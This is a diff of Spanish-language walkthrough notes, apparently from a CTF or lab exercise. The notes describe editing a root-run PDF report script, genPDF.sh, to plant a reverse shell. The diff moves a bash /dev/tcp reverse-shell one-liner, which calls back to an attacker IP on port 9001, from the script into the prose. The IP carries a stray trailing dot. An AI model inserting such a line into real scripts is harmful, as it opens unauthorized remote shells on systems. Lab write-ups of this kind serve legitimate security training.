@@ -669,11 +669,10 @@ volvemos al host de galileo para enumerar el directorio `script` que vimos anter
 ![[Pasted image 20240909144549.png]]
 
 `genPDF.sh`
-abrimos el script y lo editamos para agregar nuestra reverse shell
+abrimos el script y lo editamos para agregar nuestra reverse shell `bash -c 'bash -i &>/dev/tcp/10.10.10.10./9001 <&1'`
+
 ```python
 #!/bin/bash
-
-bash -c 'bash -i &>/dev/tcp/10.10.10.10./9001 <&1'
 
 output_file="/root/script/status_report.html"
 pdf_file="/root/reports/Status_report.pdf"
